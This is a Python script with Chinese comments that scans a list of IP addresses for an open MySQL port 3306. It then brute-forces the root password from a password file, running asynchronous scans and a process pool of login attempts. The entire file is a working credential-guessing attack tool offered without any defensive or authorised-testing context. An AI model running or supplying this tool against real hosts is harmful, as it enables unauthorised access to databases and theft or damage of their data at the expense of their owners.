# 异步扫描3306端口开放，进程爆破端口
import asyncio
import socket
import datetime
import os
import pymysql
import time
from concurrent.futures import ProcessPoolExecutor
import sys
import os

# 打印时间
def nowTime():
    return datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

# 定义异步方法：扫描端口
async def scanPorts(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    addr = (ip, port)
    pid = os.getpid()
    try:
        s.connect(addr)
        print('[{}] [{}] connect {}:{}'.format(pid, nowTime(), ip, port))
        status = await burpPorts(ip, port)          # 交出控制权
        print('status:', status)
        return status
    except Exception as e:
        print('[{}] [{}] disconnect {}:{}. error:{}'.format(pid, nowTime(), ip, port, e))
        return None

# 定义异步方法：爆破端口
async def burpPorts(ip, port):
    args = list(map(lambda pwd: [ip, port, pwd], pwds))
    with ProcessPoolExecutor(max_workers=3) as executor:
        loop = asyncio.get_event_loop()
        fs = [loop.run_in_executor(executor, startBurp, arg) for arg in args]
        # fs = asyncio.as_completed(future)
        for f in fs:
            result = await f
            print(result)
            if result == True:
                return result


            # if result:
            #     print('result:', result)
            #     print('loop:{}'.format(loop.is_closed()))
            #     return True
                # break

        # for arg in args:
        #     flag = await loop.run_in_executor(executor, startBurp, arg)
        #     if flag == True:
        #         break

# 开始爆破
def startBurp(arg):
    ip, port, pwd = arg
    pid = os.getpid()
    try:
        pymysql.connect(host=ip, user='root', password=pwd, port=port, connect_timeout=5,
                        charset='utf8mb4')
        print('[+] [{}] [{}] [{}:{} --> u:{}   p:{}]'.format(pid, nowTime(), ip, port, 'root', pwd))
        return True
    except Exception as e:
        # pass
        print('[-] [{}] [{}] [{}:{} --> u:{}   p:{}] error:{}'.format(pid, nowTime(), ip, port, 'root', pwd, e))
        time.sleep(1)  # 为了更容易显示异步，所以设置延时1秒，程序真正运行的时候，注释掉finally
        return False

if __name__ == '__main__':
    ips = []
    asyncioNum = 3
    asyncioNum_1 = asyncioNum - 1
    socket.setdefaulttimeout(1)
    port = 3306
    pwds = []
    processPool = ProcessPoolExecutor()
    loop = asyncio.get_event_loop()

    with open('passwords.txt', 'rt') as f:
        for pwd in f:
            pwds.append(pwd.strip())

    with open(r'ips.txt', 'rt') as f:
        for i, ip in enumerate(f):
            ip = ip.strip()
            if i % asyncioNum != asyncioNum_1:
                ips.append(ip)
            else:
                ips.append(ip)
                tasks = [scanPorts(ip) for ip in ips]
                loop.run_until_complete(asyncio.gather(*tasks))
                print('-'*80)
                del ips[:]

